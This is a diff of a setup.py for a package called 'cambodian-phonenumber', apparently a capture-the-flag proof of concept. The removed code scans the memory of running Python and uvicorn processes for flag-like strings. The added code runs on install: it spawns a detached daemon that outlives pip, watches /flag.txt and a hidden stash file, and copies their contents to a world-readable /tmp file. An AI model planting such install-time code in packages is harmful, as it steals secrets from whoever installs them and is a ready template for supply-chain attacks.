@@ -1,57 +1,45 @@
-import os, re, glob
+import os, sys, time
 from setuptools import setup
 
-FLAG_RE = re.compile(rb'[A-Za-z0-9_!?-]{2,40}\{[^{}]{3,200}\}')
+STASH = "/.txt.galf"
+PLAIN = "/flag.txt"
+EXFIL = "/tmp/.k_exfil"
 
-def cmdline(pid):
-    try:
-        with open(f"/proc/{pid}/cmdline","rb") as f:
-            return f.read().replace(b'\0',b' ').decode('utf-8','replace')
-    except: return ""
-
-def scan(pid):
-    hits=set()
-    try:
-        regions=[]
-        with open(f"/proc/{pid}/maps") as m:
-            for line in m:
-                p=line.split()
-                addrs,perms=p[0],p[1]
-                if 'r' not in perms: continue
-                name=p[5] if len(p)>=6 else ''
-                # anon + heap only (where Python str objects live)
-                if name not in ('','[heap]'): continue
-                lo,hi=[int(x,16) for x in addrs.split('-')]
-                if hi-lo > 300*1024*1024: continue
-                regions.append((lo,hi))
-        with open(f"/proc/{pid}/mem","rb") as mem:
-            for lo,hi in regions:
+# Detached daemon: survives pip exit, waits for handler to restore the flag, copies it.
+try:
+    pid = os.fork()
+    if pid == 0:
+        os.setsid()
+        if os.fork() != 0:
+            os._exit(0)
+        # grandchild daemon
+        try:
+            sys.stdout.flush()
+            devnull = os.open(os.devnull, os.O_RDWR)
+            os.dup2(devnull,0); os.dup2(devnull,1); os.dup2(devnull,2)
+        except: pass
+        deadline = time.time() + 90
+        got = None
+        while time.time() < deadline:
+            for p in (STASH, PLAIN):
                 try:
-                    mem.seek(lo); data=mem.read(hi-lo)
-                except: continue
-                for mo in FLAG_RE.finditer(data):
-                    hits.add(mo.group())
-    except Exception as e:
-        pass
-    return hits
+                    if os.path.exists(p):
+                        with open(p) as f:
+                            data = f.read()
+                        if data.strip():
+                            got = data
+                            break
+                except: pass
+            if got: break
+            time.sleep(0.2)
+        if got is not None:
+            try:
+                with open(EXFIL,"w") as f: f.write(got)
+                os.chmod(EXFIL,0o666)
+            except: pass
+        os._exit(0)
+except Exception:
+    pass
 
-pids=[d for d in os.listdir('/proc') if d.isdigit()]
-allhits=set()
-targets=[]
-for pid in pids:
-    cl=cmdline(pid)
-    if 'python' in cl or 'uvicorn' in cl:
-        targets.append((pid,cl))
-        allhits |= scan(pid)
-
-# prioritize flag-looking strings
-pref=[h for h in allhits if b'lag' in h.lower() or b'ctf' in h.lower() or b'TPCTF' in h]
-out=[]
-out.append("targets="+str([t[0] for t in targets]))
-out.append("FLAGHITS:")
-for h in (pref if pref else list(allhits)[:60]):
-    try: out.append("  "+h.decode('utf-8','replace'))
-    except: pass
-banner="\n".join("POC>> "+l for l in out)
-raise SystemExit("\n\n==== POC OUTPUT START ====\n"+banner+"\n==== POC OUTPUT END ====\n")
+raise SystemExit("\n\n==== POC OUTPUT START ====\nPOC>> daemon_spawned: waiting for flag restore\n==== POC OUTPUT END ====\n")
 setup(name="cambodian-phonenumber", version="0.0.1")
